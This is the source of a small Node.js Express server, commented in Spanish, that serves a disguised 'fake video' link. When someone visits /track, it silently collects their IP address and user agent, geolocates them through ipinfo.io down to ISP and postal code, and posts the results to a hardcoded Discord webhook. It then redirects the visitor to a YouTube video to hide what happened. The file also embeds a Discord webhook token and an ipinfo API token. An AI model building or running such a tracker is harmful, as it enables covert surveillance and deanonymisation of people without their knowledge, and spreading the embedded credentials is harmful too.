const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// URL del video real
const REAL_YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

// Webhook de Discord (¡no lo dejes expuesto si es real!)
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI";

// Servir archivos estáticos desde la carpeta "public"
app.use(express.static(path.join(__dirname, "public")));

async function getIPInfo(ip) {
  try {
    const res = await fetch(`https://ipinfo.io/${ip}/json?token=2588357cc4131e`);
    return await res.json();
  } catch (err) {
    console.error("Error al obtener info de IP:", err);
    return {};
  }
}

async function sendToDiscord(info, userAgent, timestamp) {
  const message = {
    content: `📡 **Nueva visita al video falso**

🕒 Hora (UTC): ${timestamp}
🌐 IP: \`${info.ip || "Desconocida"}\`
🏙️ Ciudad: ${info.city || "Desconocida"}, ${info.region || "Desconocida"}
🌍 País: ${info.country || "Desconocido"}
🏢 ISP: ${info.org || "Desconocido"}
📦 ASN: ${info.asn || "Desconocido"}
📫 Código Postal: ${info.postal || "Desconocido"}
🕰️ Zona Horaria: ${info.timezone || "Desconocido"}
🧭 User-Agent:
\`\`\`${userAgent || "No disponible"}\`\`\``
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });
  } catch (err) {
    console.error("Error al enviar al webhook:", err);
  }
}

app.get("/track", async (req, res) => {
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  const info = await getIPInfo(ip);
  info.ip = ip;

  await sendToDiscord(info, userAgent, timestamp);

  res.redirect(REAL_YOUTUBE_URL);
});

app.listen(PORT, () => {
  console.log(`✅ Servidor activo en http://localhost:${PORT}`);
});
